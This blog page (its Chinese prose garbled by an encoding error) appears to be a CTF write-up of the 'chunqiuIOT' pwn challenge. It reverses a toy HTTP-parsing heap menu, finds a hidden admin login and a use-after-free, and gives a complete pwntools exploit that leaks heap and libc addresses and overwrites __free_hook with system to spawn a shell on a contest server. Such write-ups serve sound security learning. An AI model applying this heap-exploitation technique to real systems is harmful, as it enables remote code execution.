<!DOCTYPE html>
<html>
    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
    <title>é·ºé›¨ã®Blog | </title>
    
<link rel="stylesheet" href="/css/reset.css">

    
<link rel="stylesheet" href="/css/style.css">

    
<link rel="stylesheet" href="/css/markdown.css">

    
<link rel="stylesheet" href="/css/fonts.css">

<meta name="generator" content="Hexo 6.2.0"></head>
    <body>
        <div class="paper">
            <div class="paper-main">
                
                    <div class="post-header">
    <a class="logo" href="/">é·ºé›¨ã®Blog</a>
    <a class="go-home" href="/">
        <svg width="8" height="14" viewBox="0 0 8 14">
            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
    </a>
</div>
                
                <div class="post-main">

    
    
        <div class="post-main-title">
            iæ˜¥ç§‹æ˜¥å­£èµ›-å‹‡è€…å·…å³°-chunqiuIOT
        </div>
        <div class="post-meta">
            2022-11-03
        </div>
        <div class="post-md">
            <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ˜¯ä»Šå¹´ä¸ŠåŠå¹´æ¯”èµ›çš„ä¸€é“é¢˜ç›®ï¼Œé‚£ä¸ªæ—¶å€™æ‰åˆšåˆšæ¥è§¦å †ï¼Œæ ˆä¹Ÿä¸æ˜¯å¾ˆç†Ÿã€‚æ‰“å¼€ç¨‹åºåŸºæœ¬å°±æ”¾å¼ƒäº†ï¼Œå‰ä¸€æ®µæ—¶é—´å¤ç°äº†å‡ ä¸ªIOTç›¸å…³çš„CVEï¼Œå€Ÿæ­¤å¥‘æœºé¡ºä¾¿çœ‹çœ‹å‡ ä¸ªæœˆå‰è‡ªå·±æ”¾å¼ƒçš„é‚£é“é¢˜ã€‚æœ‰ä¸€è¯´ä¸€ï¼Œè¿™é“é¢˜çš„é€†å‘éƒ¨åˆ†è¿˜æ˜¯å¾ˆå¤´ç–¼çš„ï¼Œé€†äº†ä¸€ä¸ªä¸‹åˆ+ä¸€ä¸ªæ—©ä¸Šæ‰çœ‹å®Œç¨‹åºé€»è¾‘â€”-å¥—çš®å †é¢˜ç½¢äº†ã€‚</p>
<blockquote>
<p>æˆ‘æ–°å»ºäº†ä¸€ä¸ªåº“ï¼Œç”¨äºå­˜æ”¾å„ç§æ¯”èµ›çš„é¢˜ç›®ï¼Œæˆ‘åšå®¢å†…WPæ¶‰åŠçš„é¢˜ç›®åŸºæœ¬éƒ½èƒ½æ‰¾åˆ°ï¼Œé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://github.com/Loora1N/PWNchanllenge/tree/main/chunzhiIot">PWNchanllenge&#x2F;chunzhiIot at main Â· Loora1N&#x2F;PWNchanllenge (github.com)</a></p>
</blockquote>
<h2 id="é€†å‘éƒ¨åˆ†"><a href="#é€†å‘éƒ¨åˆ†" class="headerlink" title="é€†å‘éƒ¨åˆ†"></a>é€†å‘éƒ¨åˆ†</h2><p>é¦–å…ˆæ‰¾åˆ°ä¸»å‡½æ•°ï¼Œæ¯”è¾ƒç®€ä»‹ï¼Œå¾ªç¯è¯»å…¥ä¸€ä¸ª<code>0X3FF</code>å­—èŠ‚ï¼Œç„¶åå¯¹<code>s</code>è¿›è¡Œè§£æå¤„ç†</p>
<p><img src="/img/article/chunqiuiot/image-20221103201403318.png" alt="image-20221103201403318"></p>
<p>è·Ÿè¿›<code>1BDC</code>å‡½æ•°</p>
<p><img src="/img/article/chunqiuiot/image-20221103202054328.png" alt="image-20221103202054328"></p>
<p>è¿™é‡Œæœ‰è…¾å‡ºäº†ä¸€ä¸ªå­—ç¬¦ä¸²ç©ºé—´ï¼Œè·Ÿè¿›<code>sub_1852</code>å‡½æ•°ã€‚</p>
<blockquote>
<p>å› ä¸ºæˆ‘æ”¹äº†ä¸€éƒ¨åˆ†å˜é‡åå’Œå‡½æ•°åï¼Œæ‰€ä»¥å¯èƒ½ä¸ç›´æ¥åæ±‡ç¼–é™¤äº†ç»“æœç•¥æœ‰ä¸åŒ</p>
</blockquote>
<pre><code class="c">__int64 __fastcall sub_1852(char *a1, __int64 a2)
&#123;
  char *haystack; // [rsp+8h] [rbp-28h]
  int cnt; // [rsp+1Ch] [rbp-14h]
  char *v5; // [rsp+20h] [rbp-10h]
  const char *front_part; // [rsp+28h] [rbp-8h]
  char *s2a; // [rsp+28h] [rbp-8h]
  const char *s2b; // [rsp+28h] [rbp-8h]

  haystack = a1;
  cnt = 1;
  v5 = strstr(a1, &quot;\r\n&quot;);
  if ( v5 )
  &#123;
    v5[1] = &#39; &#39;;
    *v5 = 0;
    v5 += 2;                                    // trans &quot;\r\n&quot; into &quot;\x00&quot;+&quot; &quot;
  &#125;
  while ( v5 &amp;&amp; cnt &lt;= 15 )
  &#123;
    front_part = strtok(haystack, &quot; &quot;);
    if ( cnt == 1 )
    &#123;
      if ( !strcmp(&quot;GET&quot;, front_part) )
      &#123;
        *(a2 + 16) = 1;
      &#125;
      else if ( *(a2 + 16) || strcmp(&quot;HEAD&quot;, front_part) )
      &#123;
        if ( *(a2 + 16) || strcmp(&quot;POST&quot;, front_part) )
        &#123;
          if ( *(a2 + 16) || strcmp(&quot;PUT&quot;, front_part) )
          &#123;
            if ( *(a2 + 16) || strcmp(&quot;DELETE&quot;, front_part) )
            &#123;
              if ( *(a2 + 16) || strcmp(&quot;TRACE&quot;, front_part) )
              &#123;
                if ( *(a2 + 16) || strcmp(&quot;OPTIONS&quot;, front_part) )
                &#123;
                  if ( *(a2 + 16) || strcmp(&quot;CONNECT&quot;, front_part) )
                  &#123;
                    if ( *(a2 + 16) || strcmp(&quot;DEV&quot;, front_part) )
                      return 0LL;
                    *(a2 + 16) = 8;
                  &#125;
                  else
                  &#123;
                    *(a2 + 16) = 7;
                  &#125;
                &#125;
                else
                &#123;
                  *(a2 + 16) = 6;
                &#125;
              &#125;
              else
              &#123;
                *(a2 + 16) = 5;
              &#125;
            &#125;
            else
            &#123;
              *(a2 + 16) = 4;
            &#125;
          &#125;
          else
          &#123;
            *(a2 + 16) = 3;
          &#125;
        &#125;
        else
        &#123;
          *(a2 + 16) = 2;
        &#125;
      &#125;
      else
      &#123;
        *(a2 + 16) = 0;
      &#125;
      s2a = strtok(0LL, &quot; &quot;);
      if ( s2a != strchr(s2a, &#39;/&#39;) )
        return 0LL;
      *a2 = s2a;
      s2b = strtok(0LL, &quot; &quot;);
      if ( !strcmp(s2b, &quot;HTTP/1.0&quot;) &amp;&amp; !strcmp(s2b, &quot;HTTP/1.1&quot;) )
        return 0LL;
      haystack = v5;
      v5 = strstr(v5, &quot;\r\n&quot;);
      if ( v5 )                                 // same to the top
      &#123;
        v5[1] = 32;
        *v5 = 0;
        v5 += 2;
      &#125;
      cnt = 2;
    &#125;
    else
    &#123;
      if ( !strchr(front_part, &#39;:&#39;) )
        return 0LL;
      haystack = v5;
      v5 = strstr(v5, &quot;\r\n&quot;);
      if ( v5 )
      &#123;
        v5[1] = 32;
        *v5 = 0;
        v5 += 2;
      &#125;
      ++cnt;
    &#125;
  &#125;
  if ( cnt == 1 )
    return 0LL;
  *(a2 + 8) = haystack;
  return 1LL;
&#125;
</code></pre>
<p>è¿™é‡Œæ˜¯åšäº†ä¸€ä¸ªHTTPçš„æŠ¥æ–‡è§£æï¼Œæ ¹æ®å¤´çš„ä¸åŒï¼Œæœ‰ä¸åŒçš„è¿”å›å€¼ï¼Œå¹¶ä¸”ä¼šå°†æŠ¥æ–‡ç»“å°¾â€™\r\nâ€™ä¹‹åçš„å­—ç¬¦ä¸²èµ‹å€¼ç»™ä¼ è¿›æ¥çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚å³è¿™ä¸ªå‡½æ•°ä¸»è¦å¹²äº†ä¸‰ä»¶äº‹</p>
<ul>
<li>è§£æHTTPæŠ¥æ–‡ï¼Œç¡®å®šå‡½æ•°è¿”å›å€¼</li>
<li>æ ¹æ®è¯·æ±‚ç±»å‹èµ‹å€¼ç»™<code>a2+16</code>ä¸åŒçš„å€¼</li>
<li>å°†é™„å¸¦å­—ç¬¦ä¸²èµ‹å€¼ç»™<code>a2+8</code>çš„åœ°å€</li>
</ul>
<p>æˆ‘ä»¬ç»§ç»­çœ‹å¦å¤–ä¸€ä¸ªå‡½æ•°</p>
<pre><code class="c">int __fastcall sub_15FD(__int64 a1)
&#123;
  int result; // eax
  int idx; // eax
  unsigned int choice; // [rsp+14h] [rbp-2Ch]
  __int64 idx2; // [rsp+18h] [rbp-28h]
  unsigned __int64 size; // [rsp+20h] [rbp-20h]
  char *nptr; // [rsp+38h] [rbp-8h]
  const char *nptra; // [rsp+38h] [rbp-8h]
  const char *nptrb; // [rsp+38h] [rbp-8h]
  char *pointer; // [rsp+38h] [rbp-8h]
  char *pointer2; // [rsp+38h] [rbp-8h]

  if ( *(a1 + 16) == 2 )                        // POSTæ–¹æ³•è¿›å…¥
  &#123;
    nptr = strtok(*(a1 + 8), &quot;&amp;&quot;);              // use &#39;&amp;&#39; to split the string
                                                // choice &amp; idx
    if ( !nptr )
      return 0;
    choice = *nptr;
    nptra = strtok(0LL, &quot;&amp;&quot;);
    if ( !nptra )
      return 0;
    idx = atoi(nptra);
    idx2 = idx;
    if ( idx &gt; 0x10 )
      return 0;
    if ( !flag )
      return 0;
    if ( choice == 4 )
    &#123;
      del(idx);                                 // free(un4040+idx)
                                                // UAF
      return 1;
    &#125;
    if ( choice &lt;= 4 )
    &#123;
      switch ( choice )
      &#123;
        case 3u:
          show(idx);                            // show(un4040+v2)
          return 1;
        case 1u:                                // 1&amp;idx&amp;size&amp;pointer
          nptrb = strtok(0LL, &quot;&amp;&quot;);
          if ( !nptrb )
            return 0;
          size = atoi(nptrb);
          if ( size &gt; 0x500 )
            return 0;
          pointer = strtok(0LL, &quot;&amp;&quot;);
          if ( !pointer )
            return 0;
          create(idx2, size, pointer);          // un4040+idx = malloc(size)
                                                // memcpy(chunk,pointer,size)
          return 1;
        case 2u:
          pointer2 = strtok(0LL, &quot;&amp;&quot;);
          if ( !pointer2 )
            return 0;
          strcpy(idx2, pointer2);               //  memcpy(*(&amp;unk_4040 + idx), nptrd, str(nptrd))
          return 1;
      &#125;
    &#125;
  &#125;
  result = *(a1 + 16);
  if ( result == 8 )
  &#123;
    result = strcmp(*(a1 + 8), &quot;rotartsinimda&quot;);// admin is trator
    if ( !result )
      flag = 1;
  &#125;
  return result;
&#125;
</code></pre>
<p>è¿™ä¸ªå‡½æ•°ä¸»è¦å¹²äº†è¿™å‡ ä»¶äº‹</p>
<ul>
<li>æ ¹æ®<code>a1+16</code>çš„å€¼ä¸åŒï¼Œè¿›å…¥ä¸åŒçš„åˆ¤æ–­åˆ†æ”¯(<code>a1+16</code>çš„å€¼æ˜¯ç”±æŠ¥æ–‡è¯·æ±‚æ–¹å¼å†³å®šï¼‰</li>
<li>ç”¨<code>&amp;</code>åˆ†å‰²äº†<code>a1+8</code>å¤„çš„å­—ç¬¦ä¸²ï¼Œå¹¶æ ¹æ®å­—ç¬¦ä¸²å†³å®šä¸åŒå‡½æ•°</li>
<li>å®ç°äº†ä¸€èˆ¬å †é¢˜ç›®çš„å‡ ä¸ªå‡½æ•°</li>
</ul>
<blockquote>
<p>å¦å¤–éœ€è¦æ³¨æ„ï¼Œè¦å°†flagç½®1æ‰èƒ½è¿›å…¥å †æ“ä½œçš„é€‰å•ï¼Œæ‰€ä»¥å…ˆè¦è¿›å…¥æœ€ä¸‹é¢çš„å­—ç¬¦ä¸²åˆ¤æ–­</p>
</blockquote>
<p><img src="/img/article/chunqiuiot/image-20221103203402587.png" alt="image-20221103203402587"></p>
<p>ç»“åˆå‰é¢çš„åˆ†æï¼Œæˆ‘ä»¬åŸºæœ¬ç¡®å®špayloadçš„å½¢å¼ä¸ºç±»ä¼¼å¦‚ä¸‹ç‰¹å¾</p>
<p><code>POST / HTTP/1.1\r\n\x01&amp;1&amp;0x30&amp;aaaa</code></p>
<p>è¿™ä¸ªç¨‹åºçš„æ¼æ´ä¸»è¦åœ¨<code>free</code>è¿™é‡Œï¼Œå­˜åœ¨UAFæ¼æ´</p>
<p><img src="/img/article/chunqiuiot/image-20221103203911463.png" alt="image-20221103203911463"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>åŸºæœ¬åˆ©ç”¨å°±æ¯”è¾ƒç®€å•äº†ï¼Œæ³„éœ²<code>heapbase</code>å’Œ<code>libc</code>ååŠ«æŒ<code>free_hook</code>å³å¯ï¼Œè¿™é“é¢˜ä¸»è¦è¿˜æ˜¯ä»£ç é€»è¾‘ç›¸å¯¹éš¾ä¸€äº›ğŸ˜­</p>
<pre><code class="python">from pwn import *

# io = process(&#39;./pwn&#39;)
io = remote(&#39;210.30.97.133&#39;,28094)
libc = ELF(&#39;./libc.so&#39;)
context.log_level = &#39;debug&#39;
context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;, &#39;-F&#39; &#39;#&#123;pane_pid&#125;&#39;, &#39;-P&#39;]
context.arch = &#39;amd64&#39;
context.os = &#39;linux&#39;


def login():
    io.recvuntil(&#39;Waiting Package...&#39;)   
    payload = &quot;DEV / HTPP/1.1\r\nrotartsinimda\x00&quot;
    io.sendline(payload)

def create(idx,size,text):
    io.recvuntil(&#39;Waiting Package...&#39;)   
    payload = &quot;POST / HTTP/1.1\r\n&quot;+&#39;\x01&#39;+&#39;&amp;&#39;+str(idx)+&#39;&amp;&#39;+str(size)+&#39;&amp;&#39;+ text
    io.sendline(payload)
    
def free(idx):
    io.recvuntil(&#39;Waiting Package...&#39;)   
    payload = &quot;POST / HTTP/1.1\r\n&quot;+&#39;\x04&#39;+&#39;&amp;&#39;+str(idx)
    io.sendline(payload)
    
def show(idx):
    io.recvuntil(&#39;Waiting Package...&#39;)   
    payload = &quot;POST / HTTP/1.1\r\n&quot;+&#39;\x03&#39;+&#39;&amp;&#39;+str(idx)
    io.sendline(payload)
    
def edit(idx,text):
    io.recvuntil(&#39;Waiting Package...&#39;)   
    payload = &quot;POST / HTTP/1.1\r\n&quot;+&#39;\x02&#39;+&#39;&amp;&#39;+str(idx)+&#39;&amp;&#39;+ text
    io.sendline(payload)
    
def p():
    gdb.attach(proc.pidof(io)[0])


def pwn():
    login()
    # pause()
    for i in range(7):
        create(i,0x90,&#39;aaaa&#39;)

    free(0)    
    show(0)
    io.recvuntil(&#39;Content-Length: 5\n&#39;)
    # io.recvline()
    key = u64(io.recv(5).ljust(8,b&#39;\x00&#39;))
    heapbase = key&lt;&lt;12
    
   
    # edit(7,&#39;a\x00&#39;)
    create(7,0x420,&#39;aaaa&#39;)
    create(8,0x30,&#39;bbbb&#39;)
    free(7)
    # p()
    create(9,0x430,&#39;cc&#39;)
    # p()
    show(7)
    # p()
    io.recvuntil(&#39;Content-Length: 6\n&#39;)
    libc_base = u64(io.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x1e0ff0
    success(&#39;libc_base--&gt;&#39;+hex(libc_base))
    success(&quot;key--&gt;&quot;+hex(key))
    success(&quot;heapbase--&gt;&quot;+hex(heapbase))
    
    free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]
    system_addr = libc_base + libc.symbols[&#39;system&#39;]    
    # free(0)
    
    create(11,0x30,&#39;a&#39;)
    create(12,0x30,&#39;b&#39;)
    create(13,0x30,&#39;c&#39;)
    free(11)
    free(12)
    edit(12,p64(free_hook^key))
    # p()
    create(14,0x30,&#39;/bin/sh&#39;)
    create(15,0x30,p64(system_addr))
    free(14)
    success(&#39;free_hook--&gt;&#39;+hex(free_hook))
    success(&#39;system--&gt;&#39;+hex(system_addr))
    
    # p()
       
    
    io.interactive()
    
    
if __name__ == &#39;__main__&#39;:
    pwn()
</code></pre>

        </div>

    

</div>
                <div class="footer">
    <span>Copyright Â© 2022 é·ºé›¨ã®Blog</span>
    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">é€™æè¨­è¨ˆ</a></span>
</div>


<link rel="stylesheet" href="/css/a11y-dark.min.css">


<script src="/js/highlight.min.js"></script>


<script src="/js/highlightjs-line-numbers.js"></script>


<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>

            </div>
        </div>
    <!-- hexo injector body_end start -->
  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
  <script data-pjax>
        function GithubCalendarConfig(){
            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?Loora1N";
            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
            var git_user ="Loora1N";
            var parent_div_git = document.getElementById('recent-posts');
            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
            if(parent_div_git && location.pathname =='/about/'){
                console.log('å·²æŒ‚è½½github calendar')
                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // æ— æŠ¥é”™ï¼Œä½†ä¸å½±å“ä½¿ç”¨(æ”¯æŒpjaxè·³è½¬)
                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // æœ‰æŠ¥é”™ï¼Œä½†ä¸å½±å“ä½¿ç”¨(æ”¯æŒpjaxè·³è½¬)
            };
            GithubCalendar(git_githubapiurl,git_color,git_user)
        }
        if(document.getElementById('recent-posts')){
            GithubCalendarConfig()
        }
    </script>
    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
    <style></style><!-- hexo injector body_end end --></body>
</html>